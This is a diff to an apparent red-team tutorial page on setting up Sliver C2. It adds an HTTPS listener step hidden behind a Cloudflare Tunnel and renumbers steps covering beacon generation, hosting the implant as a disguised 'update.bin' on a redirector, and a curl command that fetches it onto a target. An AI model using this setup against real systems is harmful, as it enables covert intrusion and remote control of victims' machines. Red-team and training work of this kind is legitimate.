@@ -955,12 +955,42 @@ sudo mv sliver-server_linux /usr/local/bin/sliver-server
 sudo chmod +x /usr/local/bin/sliver-server</code></pre>
 
   <div class="note">
-    <strong>For detailed Sliver installation:</strong> See my comprehensive guide at <a href="sliver-c2-getting-started.html">Getting Started with Sliver C2</a>
+    <strong>For detailed Sliver installation:</strong> See my comprehensive guide at <a href="../writeups/sliver-c2-getting-started.html">Getting Started with Sliver C2</a>
   </div>
 
   <h2 id="phase-5">Phase 5: Beacon Generation & Deployment</h2>
 
-  <h3><span class="step">[Step 1]</span> Generate Beacon with Failover</h3>
+  <h3><span class="step">[Step 1]</span> Create HTTPS Job Listener</h3>
+
+  <p><strong>In Sliver console:</strong></p>
+  <pre><code>sliver &gt; jobs
+
+sliver &gt; https --lhost 127.0.0.1 --lport 443 --domain c2.example.com</code></pre>
+
+  <p><strong>Parameters:</strong></p>
+  <ul>
+    <li><code>--lhost</code>: Local IP address to bind the listener (127.0.0.1 for tunnel)</li>
+    <li><code>--lport</code>: Local port to bind the listener (443 for HTTPS)</li>
+    <li><code>--domain</code>: Domain name for the C2 server (c2.example.com)</li>
+  </ul>
+
+  <p><strong>Expected output:</strong></p>
+  <pre><code>[*] Starting HTTPS :443 listener ...
+[*] Successfully started job #1</code></pre>
+
+  <p><strong>Verify listener is running:</strong></p>
+  <pre><code>sliver &gt; jobs
+
+ ID   Name    Protocol   Port
+==== ======= ========== ======
+ 1    https   tcp        443</code></pre>
+
+  <div class="note">
+    <strong>Why bind to 127.0.0.1:</strong><br>
+    The listener binds to localhost because the Cloudflare Tunnel (cloudflared) forwards traffic from <code>c2.example.com</code> to <code>127.0.0.1:443</code>. This ensures the C2 server is never directly exposed to the internet.
+  </div>
+
+  <h3><span class="step">[Step 2]</span> Generate Beacon with Failover</h3>
 
   <p><strong>In Sliver console:</strong></p>
   <pre><code>sliver &gt; generate beacon \
@@ -985,7 +1015,7 @@ sudo chmod +x /usr/local/bin/sliver-server</code></pre>
 [*] Build completed in 3s
 [*] Implant saved to /tmp/linux_beacon</code></pre>
 
-  <h3><span class="step">[Step 2]</span> Verify Beacon Binary</h3>
+  <h3><span class="step">[Step 3]</span> Verify Beacon Binary</h3>
 
   <pre><code>file /tmp/linux_beacon
 # Expected: ELF 64-bit LSB executable, x86-64 (for amd64)
@@ -993,7 +1023,7 @@ sudo chmod +x /usr/local/bin/sliver-server</code></pre>
 ls -lh /tmp/linux_beacon
 # Check size (typically 8-15 MB)</code></pre>
 
-  <h3><span class="step">[Step 3]</span> Deploy Beacon to Redirector</h3>
+  <h3><span class="step">[Step 4]</span> Deploy Beacon to Redirector</h3>
 
   <pre><code># Copy to redirector
 scp /tmp/linux_beacon operator@r1.example.com:/tmp/
@@ -1014,7 +1044,7 @@ ls -la /var/www/implants/
     <code>chmod 644</code>: Owner (www-data) can read/write, everyone else can only read. File is NOT executable by web server for security.
   </div>
 
-  <h3><span class="step">[Step 4]</span> Test Implant Download</h3>
+  <h3><span class="step">[Step 5]</span> Test Implant Download</h3>
 
   <pre><code># From local machine - test download
 curl -I https://r1.example.com/downloads/update.bin
@@ -1031,13 +1061,13 @@ md5sum /tmp/test_beacon
 md5sum /tmp/linux_beacon
 # MD5 sums should match</code></pre>
 
-  <h3><span class="step">[Step 5]</span> Execute Beacon on Test System</h3>
+  <h3><span class="step">[Step 6]</span> Execute Beacon on Test System</h3>
 
   <p><strong>On target Linux system:</strong></p>
   <pre><code># Download beacon
 curl -o /tmp/update https://r1.example.com/downloads/update.bin</code></pre>
 
-  <h3><span class="step">[Step 6]</span> Verify Beacon Callback</h3>
+  <h3><span class="step">[Step 7]</span> Verify Beacon Callback</h3>
 
   <p><strong>In Sliver console:</strong></p>
   <pre><code>sliver &gt; beacons</code></pre>
@@ -1052,7 +1082,7 @@ curl -o /tmp/update https://r1.example.com/downloads/update.bin</code></pre>
     Test System → r1.example.com/api/ → Nginx → c2.example.com → Cloudflare Tunnel → Sliver C2
   </div>
 
-  <h3><span class="step">[Step 7]</span> Test Failover</h3>
+  <h3><span class="step">[Step 8]</span> Test Failover</h3>
 
   <pre><code># Stop r1 redirector
 ssh operator@r1.example.com
